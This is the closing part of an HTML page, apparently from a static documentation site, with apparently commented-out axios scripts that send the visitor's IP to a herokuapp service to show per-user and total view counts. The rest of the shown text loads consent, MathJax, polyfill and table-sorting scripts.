                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../../javascripts/consent.js></script> <script src=../../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../../javascripts/tablesort.js></script> </body> </html>